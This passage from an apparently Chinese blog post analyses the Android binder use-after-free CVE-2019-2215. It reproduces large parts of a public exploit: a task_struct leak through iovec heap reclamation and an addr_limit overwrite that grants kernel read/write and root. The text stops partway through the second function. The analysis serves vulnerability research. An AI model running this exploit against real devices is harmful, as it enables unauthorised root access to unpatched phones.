<p>编译完goldfish后启动<code>emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S</code>等待qemu的连接。</p>
<p>gdb启动<code>gdb -quiet vmlinux -ex 'target remote :1234'</code> 键入c继续启动模拟器。</p>
<p>等待模拟器完全启动后编译poc push进模拟器。</p>
<p>binder_thread释放之前，偏移a8处为<code>wait.head</code>的值，这里我们拥有内核源码以及编译好的vmliux，所以可以直接算出来<code>wait.head</code>相对于binder_thread地址的偏移量。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/b1.png" alt=""></p>
<p>free之后未unlink之前binder_thread的值一样未变。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/b2.png" alt=""></p>
<p>unlink之后，binder_thread-&gt;wait.head写入<code>binder_thread-&gt;wait.head.next</code> and <code>binder_thread-&gt;wait.head.prev</code>两个指针。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/b3.png" alt=""></p>
<p>在未开启KASan的设备上我们看不到任何奔溃。但是调试时我们能看到确实触发了漏洞。</p>
<h3 id="0x03-漏洞利用">0x03 漏洞利用</h3>
<p>漏洞t_thread结构体如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> binder_thread {
        <span style="color:#66d9ef">struct</span> binder_proc <span style="color:#f92672">*</span>proc;
        <span style="color:#66d9ef">struct</span> rb_node rb_node;
        <span style="color:#66d9ef">struct</span> list_head waiting_thread_node;
        <span style="color:#66d9ef">int</span> pid;
        <span style="color:#66d9ef">int</span> looper;              <span style="color:#75715e">/* only modified by this thread */</span>
        <span style="color:#66d9ef">bool</span> looper_need_return; <span style="color:#75715e">/* can be written by other thread */</span>
        <span style="color:#66d9ef">struct</span> binder_transaction <span style="color:#f92672">*</span>transaction_stack;
        <span style="color:#66d9ef">struct</span> list_head todo;
        <span style="color:#66d9ef">bool</span> process_todo;
        <span style="color:#66d9ef">struct</span> binder_error return_error;
        <span style="color:#66d9ef">struct</span> binder_error reply_error;
        wait_queue_head_t wait;
        <span style="color:#66d9ef">struct</span> binder_stats stats;
        atomic_t tmp_ref;
        <span style="color:#66d9ef">bool</span> is_dead;
        <span style="color:#66d9ef">struct</span> task_struct <span style="color:#f92672">*</span>task;
};
</code></pre></div><p>注意看该结构体中有个task成员，为task_struct类型。我们首先要做的就是泄露这个结构体的地址，将它改为NULL之后，执行提权语句。下面根据<a href="https://github.com/sharif-dev/AndroidKernelVulnerability/blob/master/exploit.cpp">exp</a>分析整个提权的流程。</p>
<h4 id="patch-addr_limit">patch addr_limit</h4>
<p>阻止我们拿到权限的第一道关卡为task_struct结构体成员thread_info中的addr_limit（在x86_64上是直接作为task_struct的成员），用于隔离内核空间和用户空间。如果我们能控制它的值，相当于我们能完全的访问内核空间。所以第一步就是把addr_limit patch掉。</p>
<p>想要patch掉addr_limit，得先泄露出task_struct的地址，再将值改为<code>0xFFFFFFFFFFFFFFFE</code>。后面再说为什么要改为这个值。</p>
<p>这里先了解一下<strong>vectored I/O</strong>，也称为分散/聚集 I/O，是一种可以在单次系统调用中对多个缓冲区输入输出的方法，可以把多个缓冲区的数据写到单个数据流，也可以把单个数据流读到多个缓冲区中。与线性 I/O 相比，vectored I/O有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。支持原子性。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200629154204.png" alt=""></p>
<p>readv() 函数从文件描述符 fd 中读取 count 个段 (segment) (一个段即一个 iovec 结构体）到参数 iov 所指定的缓冲区中。</p>
<p>write() 函数从参数 iov 指定的缓冲区中读取 count 个段的数据，并写入 fd 中。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/uio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>ssize_t <span style="color:#a6e22e">readv</span> (<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> iovec <span style="color:#f92672">*</span>iov,vint count);
ssize_t <span style="color:#a6e22e">writev</span>(<span style="color:#66d9ef">int</span> fd,<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> iovec <span style="color:#f92672">*</span>iov, <span style="color:#66d9ef">int</span> count);
</code></pre></div><p>每个 iovec 结构体描述一个独立的，物理不连续的缓冲区，我们称其为段(segment)，每个iovec结构体相对较小，在64bit系统下iovec的大小仅为0x10。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> iovec
{
    <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>iov_base;    <span style="color:#75715e">/* BSD uses caddr_t (1003.1g requires void *) */</span>
    __kernel_size_t iov_len; <span style="color:#75715e">/* Must be size_t (1003.1g) */</span>
};
</code></pre></div><p>如何泄露出task_struct？看了几个exp，都用的是<code>struct iovec</code>去占位覆盖前面释放的binder_thread。这也是Project Zero的做法。这个方法最初是由Keen实验室提出的，iovec具有一些小特性使得它很适合用来作为攻击的媒介：</p>
<ol>
<li>在64bit系统下只有0x10的大小</li>
<li>容易控制它的成员iov_base和iov_len。</li>
<li>可以控制写入的个数控制iovec最终进入哪个kmalloc缓存</li>
<li>它有一个指向缓冲区的指针和一个长度，这是使用unlink进行破坏的理想字段</li>
</ol>
<p>可通过readv、writev、recvmsg、sendmsg等系统调用和iovec是实现linux下的Vectored I/O。在漏洞利用中我们可以利用来绕过检查，对已释放的空间进行占位布局堆风水。</p>
<p>看看exp如何如来泄露信息，作者写了很详细的注释：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>leakTaskStruct() {
    <span style="color:#66d9ef">int</span> pipe_fd[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    ssize_t nBytesRead <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> dataBuffer[PAGE_SIZE] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">struct</span> iovec iovecStack[IOVEC_COUNT] <span style="color:#f92672">=</span> {nullptr};
    <span style="color:#75715e">// Get binder fd
</span><span style="color:#75715e"></span>    setupBinder();
    <span style="color:#75715e">// Create event poll
</span><span style="color:#75715e"></span>    setupEventPoll();
    <span style="color:#75715e">// We are going to use iovec for scoped read/write,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// we need to make sure that iovec stays in the kernel
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// before we trigger the unlink after binder_thread has
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// been freed.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// One way to achieve this is by using the blocking APIs
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// in Linux kernel. Such APIs are read, write, etc on pipe.
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// Setup pipe for iovec
</span><span style="color:#75715e"></span>    INFO(<span style="color:#e6db74">&#34;[+] Setting up pipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    <span style="color:#66d9ef">if</span> (pipe(pipe_fd) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] Unable to create pipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Pipe created successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    }
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// pipe_fd[0] = read fd
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// pipe_fd[1] = write fd
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Default size of pipe is 65536 = 0x10000 = 64KB
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This is way much of data that we care about
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Let&#39;s reduce the size of pipe to 0x1000
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (fcntl(pipe_fd[<span style="color:#ae81ff">0</span>], F_SETPIPE_SZ, PAGE_SIZE) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] Unable to change the pipe capacity</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Changed the pipe capacity to: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, PAGE_SIZE);
    }
    INFO(<span style="color:#e6db74">&#34;[+] Setting up iovecs</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// As we are overlapping binder_thread with iovec,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// binder_thread-&gt;wait.lock will align to iovecStack[10].io_base.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// If binder_thread-&gt;wait.lock is not 0 then the thread will get
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// stuck in trying to acquire the lock and the unlink operation
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// will not happen.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// To avoid this, we need to make sure that the overlapped data
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// should be set to 0.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// we can pass a valid memory address whose lower 32bit value is 0,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// then we can avoid spin lock issue.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    mmap4gbAlignedPage();
    iovecStack[IOVEC_WQ_INDEX].iov_base <span style="color:#f92672">=</span> m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">=</span> PAGE_SIZE;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x41414141</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> PAGE_SIZE;

    <span style="color:#75715e">// Now link the poll wait queue to binder thread wait queue
</span><span style="color:#75715e"></span>    linkEventPollWaitQueueToBinderThreadWaitQueue();
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We should trigger the unlink operation when we
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// have the binder_thread reallocated as iovec array
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Now fork
</span><span style="color:#75715e"></span>    pid_t childPid <span style="color:#f92672">=</span> fork();
    <span style="color:#66d9ef">if</span> (childPid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// child process
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// There is a race window between the unlink and blocking
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// in writev, so sleep for a while to ensure that we are
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// blocking in writev before the unlink happens
</span><span style="color:#75715e"></span>        sleep(<span style="color:#ae81ff">2</span>);
        <span style="color:#75715e">// Trigger the unlink operation on the reallocated chunk
</span><span style="color:#75715e"></span>        unlinkEventPollWaitQueueFromBinderThreadWaitQueue();
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// First interesting iovec will read 0x1000 bytes of data.
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// This is just the junk data that we are not interested in
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        nBytesRead <span style="color:#f92672">=</span> read(pipe_fd[<span style="color:#ae81ff">0</span>], dataBuffer, <span style="color:#66d9ef">sizeof</span>(dataBuffer));
        <span style="color:#66d9ef">if</span> (nBytesRead <span style="color:#f92672">!=</span> PAGE_SIZE) {
            ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span>, nBytesRead, PAGE_SIZE);
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }
    <span style="color:#75715e">// parent process
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// I have seen some races which hinders the reallocation.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// So, now freeing the binder_thread after fork.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    freeBinderThread();
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Reallocate binder_thread as iovec array
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We need to make sure this writev call blocks
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This will only happen when the pipe is already full
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// This print statement was ruining the reallocation,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// spent a night to figure this out. Commenting the
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// below line.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// INFO(&#34;[+] Reallocating binder_thread\n&#34;);
</span><span style="color:#75715e"></span>
    ssize_t nBytesWritten <span style="color:#f92672">=</span> writev(pipe_fd[<span style="color:#ae81ff">1</span>], iovecStack, IOVEC_COUNT);
    <span style="color:#75715e">// If the corruption was successful, the total bytes written
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// should be equal to 0x2000. This is because there are two
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// valid iovec and the length of each is 0x1000
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (nBytesWritten <span style="color:#f92672">!=</span> PAGE_SIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesWritten, PAGE_SIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Wrote 0x%lx bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesWritten);
    }
    <span style="color:#75715e">// Now read the actual data from the corrupted iovec
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This is the leaked data from kernel address space
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// and will contain the task_struct pointer
</span><span style="color:#75715e"></span>    nBytesRead <span style="color:#f92672">=</span> read(pipe_fd[<span style="color:#ae81ff">0</span>], dataBuffer, <span style="color:#66d9ef">sizeof</span>(dataBuffer));
    <span style="color:#66d9ef">if</span> (nBytesRead <span style="color:#f92672">!=</span> PAGE_SIZE) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span>, nBytesRead, PAGE_SIZE);
        exit(EXIT_FAILURE);
    }
    <span style="color:#75715e">// Wait for the child process to exit
</span><span style="color:#75715e"></span>    wait(nullptr);
    m_task_struct <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> task_struct <span style="color:#f92672">*</span>) <span style="color:#f92672">*</span>((int64_t <span style="color:#f92672">*</span>) (dataBuffer <span style="color:#f92672">+</span> TASK_STRUCT_OFFSET_IN_LEAKED_DATA));

    m_pidAddress <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((int8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> task_struct, pid));
    m_credAddress <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((int8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> task_struct, cred));
    m_nsproxyAddress <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((int8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> task_struct, nsproxy));
    INFO(<span style="color:#e6db74">&#34;[+] Leaked task_struct: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_task_struct);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] &amp;task_struct-&gt;pid: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_pidAddress);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] &amp;task_struct-&gt;cred: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_credAddress);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] &amp;task_struct-&gt;nsproxy: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, m_nsproxyAddress);
}
</code></pre></div><p>很好理解，exp这部分首先初始化环境之后创建用于readv和writev的pipe，readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。修改pipe的size为0x1000。</p>
<p>之后创建了25个iovec，放在iovecStack里面。25个是根据binder_thread和iovec的大小算出来</p>
<p><code>IOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))</code></p>
<p>binder_thread结构体大小为408，25个iovec大小为25*16=400，正好。计算对比<strong>binder_thread</strong>中wait.head的偏移0xA0和<strong>iovecStack</strong>的偏移iovecStack[10].iov_len匹配。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200629155854.png" alt=""></p>
<p>前面动态调试时也能看到会有两个地址的值会被写入地址，这里相对应的位置为iovecStack[10].iov_len 和iovecStack[11].io_base。所以我们这里要修改iovecStack[10]的iov_len和pipe一样的大小，阻塞掉父进程的writev系统调用，再去触发unlink操作。</p>
<p>这里的iovecStack[10].io_base正好对上binder_thread-&gt;wait.lock，如果这个值不为0的话，后面在尝试取自旋锁锁会出问题，不进行unlink操作，这个值是32bit的，iov_base是64bit的，所以要设置对齐，使用mmap保证低32bit为0。</p>
<p>iovecStack[10].iov_len和iovecStack[11].iov_len设置为pipe size的大小，iovecStack[11].io_base 设置为新分配的一个地址，</p>
<p>创建fork子进程进行EPOLL_CTL_DEL操作触发unlink。读出0x1000 bytes的垃圾数据恢复进程，</p>
<p>父进程free掉binder_thread，调用writev系统进行阻塞，等待子进程完成。</p>
<p>最后父进程在调用read读出已经被子进程覆盖了内核地址处的数据，根据偏移读出泄露的task_struct指针。</p>
<p>下面这张图是<strong>Project Zero</strong> blog贴出来的流程图，方便理解整个过程。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200629014014.png" alt=""></p>
<p>既然已经有task_struct指针，接下来就可以patch 掉AddrLimit。直接看exp实现。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>clobberAddrLimit() {
    <span style="color:#66d9ef">int</span> sock_fd[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    ssize_t nBytesWritten <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">struct</span> msghdr message <span style="color:#f92672">=</span> {nullptr};
    <span style="color:#66d9ef">struct</span> iovec iovecStack[IOVEC_COUNT] <span style="color:#f92672">=</span> {nullptr};
    <span style="color:#75715e">// Get binder fd
</span><span style="color:#75715e"></span>    setupBinder();
    <span style="color:#75715e">// Create event poll
</span><span style="color:#75715e"></span>    setupEventPoll();
    INFO(<span style="color:#e6db74">&#34;[+] Setting up socket</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>, sock_fd) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] Unable to create socketpair</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Socketpair created successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    }
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We will just write junk data to socket so that when recvmsg
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// is called it process the fist valid iovec with this junk data
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// and then blocks and waits for the rest of the data to be received
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> junkSocketData[] <span style="color:#f92672">=</span> {
            <span style="color:#ae81ff">0x41</span>
    };
    INFO(<span style="color:#e6db74">&#34;[+] Writing junk data to socket</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    nBytesWritten <span style="color:#f92672">=</span> write(sock_fd[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>junkSocketData, <span style="color:#66d9ef">sizeof</span>(junkSocketData));
    <span style="color:#66d9ef">if</span> (nBytesWritten <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(junkSocketData)) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesWritten, <span style="color:#66d9ef">sizeof</span>(junkSocketData));
        exit(EXIT_FAILURE);
    }
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Write junk data to the socket so that when recvmsg is
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// called, it process the first valid iovec with this junk
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// data and then blocks for the rest of the incoming socket data
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    INFO(<span style="color:#e6db74">&#34;[+] Setting up iovecs</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#75715e">// We want to block after processing the iovec at IOVEC_WQ_INDEX,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// because then, we can trigger the unlink operation and get the
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// next iovecs corrupted to gain scoped write.
</span><span style="color:#75715e"></span>    mmap4gbAlignedPage();
    iovecStack[IOVEC_WQ_INDEX].iov_base <span style="color:#f92672">=</span> m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x41414141</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x42424242</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Prepare the data buffer that will be written to socket
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// will result in crash because of a check in do_page_fault
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// However, x86_64 does not have this check. But it&#39;s better
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// to set it to 0xFFFFFFFFFFFFFFFE so that this same code can
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// be used in arm64 as well.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> uint64_t finalSocketData[] <span style="color:#f92672">=</span> {
            <span style="color:#ae81ff">0x1</span>,                    <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX].iov_len
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x41414141</span>,             <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>,  <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span><span style="color:#75715e"></span>            (uint64_t) ((uint8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span>
                        OFFSET_TASK_STRUCT_ADDR_LIMIT), <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFE</span>      <span style="color:#75715e">// addr_limit value
</span><span style="color:#75715e"></span>    };
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Prepare the message
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    message.msg_iov <span style="color:#f92672">=</span> iovecStack;
    message.msg_iovlen <span style="color:#f92672">=</span> IOVEC_COUNT;
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Now link the poll wait queue to binder thread wait queue
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    linkEventPollWaitQueueToBinderThreadWaitQueue();
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We should trigger the unlink operation when we
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// have the binder_thread reallocated as iovec array
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// Now fork
</span><span style="color:#75715e"></span>    pid_t childPid <span style="color:#f92672">=</span> fork();
    <span style="color:#66d9ef">if</span> (childPid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// child process
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// There is a race window between the unlink and blocking
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// in writev, so sleep for a while to ensure that we are
